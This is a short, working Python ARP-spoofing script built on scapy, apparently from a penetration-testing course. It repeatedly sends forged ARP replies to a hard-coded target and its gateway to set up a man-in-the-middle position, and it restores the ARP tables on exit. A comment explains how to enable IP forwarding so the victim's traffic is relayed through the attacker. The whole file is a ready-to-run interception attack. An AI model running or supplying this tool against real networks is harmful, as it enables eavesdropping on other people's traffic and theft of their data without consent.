#!/usr/bin/env python3
import time
import scapy.all
import scapy.layers.l2
# To allow packets to flow through machine we need to execute this bash command:
# echo 1 > /proc/sys/net/ipv4/ip_forward


def get_mac(ip):  # scapy.all.ls(scapy.layers.l2.ARP()) is where we found our parameters.
    arp_request = scapy.layers.l2.ARP(pdst=ip)
    broadcast = scapy.layers.l2.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.layers.l2.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.layers.l2.ARP(op=2, pdst=target_ip,
                                 hwdst=target_mac,
                                 psrc=spoof_ip)
    # pdst is always the IP we want to spoof to. hwdst is target MAC. psrc is source aka router to spoof.
    scapy.all.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.layers.l2.ARP(op=2,
                                 pdst=destination_ip,
                                 hwdst=destination_mac,
                                 psrc=source_ip,
                                 hwsrc=source_mac)
    scapy.all.send(packet, count=4, verbose=False)


target_ip = "192.168.1.4"
gateway_ip = "192.168.1.1"
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ......Quiting.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
